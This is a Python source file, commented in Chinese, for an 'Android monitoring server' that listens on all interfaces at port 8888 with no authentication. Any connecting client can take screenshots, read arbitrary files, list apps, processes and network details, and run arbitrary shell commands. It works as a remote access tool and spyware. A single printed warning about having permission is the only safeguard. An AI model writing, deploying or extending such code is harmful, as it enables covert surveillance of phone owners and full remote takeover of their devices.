#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Android增强服务端 - 专门针对Android设备优化
支持更多Android特有功能
"""

import socket
import json
import threading
import time
import os
import sys
import base64
import platform
import subprocess
from datetime import datetime

class AndroidMonitorServer:
    def __init__(self, host='0.0.0.0', port=8888):
        self.host = host
        self.port = port
        self.server_socket = None
        self.running = False
        self.clients = []
        self.is_android = self.detect_android()
        
    def detect_android(self):
        """检测是否运行在Android上"""
        try:
            # 检查是否存在Android特有的路径
            return os.path.exists('/system/build.prop') or os.path.exists('/sdcard/')
        except:
            return False
    
    def get_android_info(self):
        """获取Android设备信息"""
        info = {}
        try:
            # 读取build.prop
            if os.path.exists('/system/build.prop'):
                with open('/system/build.prop', 'r') as f:
                    for line in f:
                        if '=' in line and not line.startswith('#'):
                            key, value = line.strip().split('=', 1)
                            if 'model' in key.lower() or 'brand' in key.lower() or 'version' in key.lower():
                                info[key] = value
        except:
            pass
        return info
    
    def get_battery_info(self):
        """获取电池信息"""
        try:
            result = subprocess.run(['dumpsys', 'battery'], 
                                  capture_output=True, text=True, timeout=5)
            battery_info = {}
            for line in result.stdout.split('\n'):
                if ':' in line:
                    key, value = line.strip().split(':', 1)
                    battery_info[key.strip()] = value.strip()
            return {'success': True, 'data': battery_info}
        except:
            return {'success': False, 'error': '无法获取电池信息'}
    
    def get_wifi_info(self):
        """获取WiFi信息"""
        try:
            result = subprocess.run(['dumpsys', 'wifi'], 
                                  capture_output=True, text=True, timeout=5)
            # 简化输出
            wifi_info = {'raw': result.stdout[:500]}
            return {'success': True, 'data': wifi_info}
        except:
            return {'success': False, 'error': '无法获取WiFi信息'}
    
    def get_installed_apps(self):
        """获取已安装应用列表"""
        try:
            result = subprocess.run(['pm', 'list', 'packages'], 
                                  capture_output=True, text=True, timeout=10)
            packages = []
            for line in result.stdout.split('\n'):
                if line.startswith('package:'):
                    packages.append(line.replace('package:', '').strip())
            return {'success': True, 'apps': packages[:50]}  # 只返回前50个
        except:
            return {'success': False, 'error': '无法获取应用列表'}
    
    def take_screenshot_android(self):
        """Android截图"""
        try:
            screenshot_path = '/sdcard/screenshot_temp.png'
            result = subprocess.run(['screencap', '-p', screenshot_path], 
                                  capture_output=True, timeout=10)
            
            if result.returncode == 0 and os.path.exists(screenshot_path):
                with open(screenshot_path, 'rb') as f:
                    img_data = base64.b64encode(f.read()).decode('utf-8')
                
                # 删除临时文件
                try:
                    os.remove(screenshot_path)
                except:
                    pass
                
                return {
                    'success': True,
                    'data': img_data,
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                }
            else:
                return {'success': False, 'error': '截图命令执行失败'}
        except Exception as e:
            return {'success': False, 'error': f'截图失败: {str(e)}'}
    
    def get_device_info(self):
        """获取设备信息"""
        info = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'platform': platform.platform(),
            'system': platform.system(),
            'is_android': self.is_android,
        }
        
        # Android特有信息
        if self.is_android:
            info['android_info'] = self.get_android_info()
        
        # 尝试获取系统信息
        try:
            import psutil
            info['cpu_percent'] = psutil.cpu_percent(interval=1)
            info['memory'] = {
                'total': psutil.virtual_memory().total,
                'available': psutil.virtual_memory().available,
                'percent': psutil.virtual_memory().percent
            }
            info['disk'] = {
                'total': psutil.disk_usage('/').total,
                'used': psutil.disk_usage('/').used,
                'free': psutil.disk_usage('/').free,
                'percent': psutil.disk_usage('/').percent
            }
        except ImportError:
            info['note'] = '安装psutil可获取更多信息'
        
        return {'success': True, 'data': info}
    
    def take_screenshot(self):
        """截图（自动选择方法）"""
        if self.is_android:
            return self.take_screenshot_android()
        else:
            # 桌面系统截图
            try:
                from PIL import ImageGrab
                import io
                
                screenshot = ImageGrab.grab()
                buffer = io.BytesIO()
                screenshot.save(buffer, format='PNG')
                img_data = base64.b64encode(buffer.getvalue()).decode('utf-8')
                
                return {
                    'success': True,
                    'data': img_data,
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                }
            except ImportError:
                return {'success': False, 'error': '需要安装Pillow'}
            except Exception as e:
                return {'success': False, 'error': str(e)}
    
    def get_running_processes(self):
        """获取运行进程"""
        try:
            import psutil
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                try:
                    processes.append(proc.info)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
            
            processes.sort(key=lambda x: x.get('cpu_percent', 0), reverse=True)
            return {'success': True, 'processes': processes[:30]}
        except ImportError:
            return {'success': False, 'error': '需要安装psutil'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def list_files(self, path=None):
        """列出文件"""
        if path is None:
            path = '/sdcard/' if self.is_android else os.path.expanduser('~')
        
        try:
            if not os.path.exists(path):
                return {'success': False, 'error': '路径不存在'}
            
            files = []
            for item in os.listdir(path):
                try:
                    full_path = os.path.join(path, item)
                    stat = os.stat(full_path)
                    files.append({
                        'name': item,
                        'is_dir': os.path.isdir(full_path),
                        'size': stat.st_size if os.path.isfile(full_path) else 0,
                        'modified': datetime.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S')
                    })
                except Exception:
                    continue
            
            return {'success': True, 'files': files, 'path': path}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def get_file_content(self, filepath):
        """读取文件"""
        try:
            if not os.path.exists(filepath):
                return {'success': False, 'error': '文件不存在'}
            
            if os.path.isdir(filepath):
                return {'success': False, 'error': '这是一个目录'}
            
            file_size = os.path.getsize(filepath)
            if file_size > 10 * 1024 * 1024:
                return {'success': False, 'error': '文件太大'}
            
            try:
                with open(filepath, 'r', encoding='utf-8') as f:
                    content = f.read()
                return {'success': True, 'content': content, 'type': 'text', 'size': file_size}
            except UnicodeDecodeError:
                with open(filepath, 'rb') as f:
                    content = base64.b64encode(f.read()).decode('utf-8')
                return {'success': True, 'content': content, 'type': 'binary', 'size': file_size}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def execute_command(self, command):
        """执行命令"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            return {
                'success': True,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': '命令执行超时'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def get_network_info(self):
        """获取网络信息"""
        try:
            import psutil
            
            interfaces = {}
            for interface, addrs in psutil.net_if_addrs().items():
                interfaces[interface] = []
                for addr in addrs:
                    interfaces[interface].append({
                        'family': str(addr.family),
                        'address': addr.address,
                        'netmask': addr.netmask,
                    })
            
            net_io = psutil.net_io_counters()
            stats = {
                'bytes_sent': net_io.bytes_sent,
                'bytes_recv': net_io.bytes_recv,
            }
            
            return {'success': True, 'interfaces': interfaces, 'stats': stats}
        except ImportError:
            return {'success': False, 'error': '需要安装psutil'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def handle_command(self, command, params=None):
        """处理命令"""
        if params is None:
            params = {}
        
        handlers = {
            'info': lambda: self.get_device_info(),
            'screenshot': lambda: self.take_screenshot(),
            'processes': lambda: self.get_running_processes(),
            'files': lambda: self.list_files(params.get('path')),
            'read_file': lambda: self.get_file_content(params.get('filepath')),
            'exec': lambda: self.execute_command(params.get('command')),
            'network': lambda: self.get_network_info(),
            'battery': lambda: self.get_battery_info() if self.is_android else {'success': False, 'error': '仅Android支持'},
            'wifi': lambda: self.get_wifi_info() if self.is_android else {'success': False, 'error': '仅Android支持'},
            'apps': lambda: self.get_installed_apps() if self.is_android else {'success': False, 'error': '仅Android支持'},
            'ping': lambda: {'success': True, 'message': 'pong', 'timestamp': datetime.now().isoformat()}
        }
        
        handler = handlers.get(command)
        if handler:
            return handler()
        else:
            return {'success': False, 'error': f'未知命令: {command}'}
    
    def handle_client(self, client_socket, address):
        """处理客户端"""
        print(f"[+] 客户端已连接: {address}")
        self.clients.append(client_socket)
        
        try:
            while self.running:
                data = client_socket.recv(8192)
                if not data:
                    break
                
                try:
                    request = json.loads(data.decode('utf-8'))
                    command = request.get('command')
                    params = request.get('params', {})
                    
                    print(f"[*] 收到命令: {command}")
                    
                    response = self.handle_command(command, params)
                    response_data = json.dumps(response, ensure_ascii=False)
                    
                    # 分块发送
                    chunk_size = 4096
                    for i in range(0, len(response_data), chunk_size):
                        chunk = response_data[i:i+chunk_size]
                        client_socket.sendall(chunk.encode('utf-8'))
                    
                    client_socket.sendall(b'\n__END__\n')
                    
                except json.JSONDecodeError:
                    error_response = json.dumps({'success': False, 'error': 'JSON解析错误'})
                    client_socket.sendall(error_response.encode('utf-8'))
                except Exception as e:
                    error_response = json.dumps({'success': False, 'error': str(e)})
                    client_socket.sendall(error_response.encode('utf-8'))
        
        except Exception as e:
            print(f"[-] 客户端处理错误: {e}")
        finally:
            print(f"[-] 客户端断开: {address}")
            if client_socket in self.clients:
                self.clients.remove(client_socket)
            client_socket.close()
    
    def start(self):
        """启动服务器"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True
            
            # 获取本机IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                s.connect(('8.8.8.8', 80))
                local_ip = s.getsockname()[0]
            except:
                local_ip = '127.0.0.1'
            finally:
                s.close()
            
            print("=" * 60)
            print("📱 Android监控服务端已启动")
            print(f"🌐 监听地址: {self.host}:{self.port}")
            print(f"📍 本机IP: {local_ip}")
            print(f"🔗 客户端连接: {local_ip}:{self.port}")
            if self.is_android:
                print("✓ 检测到Android环境，已启用Android特性")
            print("=" * 60)
            print("\n等待客户端连接...")
            
            while self.running:
                try:
                    client_socket, address = self.server_socket.accept()
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_socket, address)
                    )
                    client_thread.daemon = True
                    client_thread.start()
                except Exception as e:
                    if self.running:
                        print(f"[-] 接受连接错误: {e}")
        
        except Exception as e:
            print(f"[-] 服务器启动失败: {e}")
        finally:
            self.stop()
    
    def stop(self):
        """停止服务器"""
        print("\n[*] 正在关闭服务器...")
        self.running = False
        
        for client in self.clients:
            try:
                client.close()
            except:
                pass
        
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        
        print("[*] 服务器已关闭")

def main():
    print("\n📱 Android监控服务端 v2.0")
    print("⚠️  注意：请确保您有权监控此设备\n")
    
    port = 8888
    if len(sys.argv) > 1:
        try:
            port = int(sys.argv[1])
        except ValueError:
            print("❌ 端口号必须是数字")
            return
    
    server = AndroidMonitorServer(port=port)
    
    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[*] 收到中断信号")
        server.stop()

if __name__ == '__main__':
    main()
